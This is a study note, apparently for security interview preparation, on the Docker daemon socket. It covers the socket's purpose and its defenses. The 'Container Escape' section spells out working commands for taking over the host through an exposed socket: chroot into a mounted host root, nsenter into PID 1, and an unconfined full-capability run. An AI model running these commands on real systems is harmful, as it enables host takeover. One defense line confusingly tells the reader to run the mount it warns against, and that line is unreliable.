---
title: Daemon Socket
author: Zheng Jie
---

# Daemon Socket Overview

## Main Purpose

Main entry point and persistent process for Docker API on host OS by interfacing with underlying host kernel. UNIX socket is used by default as compared to TCP to prevent remote connection from unknown sources `"hosts": ["unix:///var/run/docker.sock"]`

## Uses Cases

* Proxy configurations if container is behind an HTTP proxy server
* Interacting with other containers
* Logging purposes

## Attack Vectors

### Privilege Escalation via Mount

Different parts of filesystem can be mounted in container with root access because docker socket runs as root. This allows escalation of privileges within the container to root privileges and potentially, enabling attackers access and modity host filesystem.

```sh
-v /:/host
-v /tmp:/host
```

### Container Escape

If container happens to run as privilege or container has improper access control, it is possible to remove all isolation from container and execute commands on actual host system.

```sh
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```

Access control plugins can also be bypassed:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/authz-and-authn-docker-access-authorization-plugin#disabling-plugin" %}

## Defenses

### Use SSH

If remote connection is needed, use SSH on `DOCKER_HOST` to ensure only SSH remote connections are permitted and not via TCP due to security reasons. TLS with CA cert can be used as an alternative.

```sh
 export DOCKER_HOST=ssh://docker-user@host1.example.com
 docker info
<prints output of the remote engine>
```

### Ensure Socket is not Mounted

Run `-v /var/run/docker.sock:/var/run/docker.sock` to ensure socket flag is not present within the container. **Do not run** `docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash`.

### Run containers as non-root users

Reduce container user privileges by running as non-root.

```sh
# Runtime example
docker run -d -u 1000 ubuntu sleep infinity
ps aux | grep sleep
> 1000 ... sleep infinity

# Build example
FROM ubuntu:latest
USER 1000
```

Additional information:

{% embed url="https://cloud.google.com/architecture/best-practices-for-operating-containers" %}

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-1-do-not-expose-the-docker-daemon-socket-even-to-the-containers" %}


## Interview Questions

* What is Docker Socket used for?
* What are the attack vectors using the socket?
* Explain some mitigation methods to prevent socket abuse. (Can list more examples not written here)

## Author

- [Zheng Jie](https://github.com/Bread7) 🍞

## References

1. [Docker - Daemon](https://docs.docker.com/reference/cli/dockerd/#examples)
2. [StackOverflow - Purpose of docker sock file](https://stackoverflow.com/questions/35110146/what-is-the-purpose-of-the-file-docker-sock)
3. [Docker - Use SSH to protect Docker Daemon Socket](https://docs.docker.com/engine/security/protect-access/)
4. [HackTricks- Docker Socket Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/abusing-docker-socket-for-privilege-escalation)
5. [Peter - Docker Security Best Practices](https://dev.to/pbnj/docker-security-best-practices-45ih#docker-engine)
6. [OWASP - Docker Seucrity](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-1-do-not-expose-the-docker-daemon-socket-even-to-the-containers)
7. [Google - Best Practices for Operating Containers](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-1-do-not-expose-the-docker-daemon-socket-even-to-the-containers)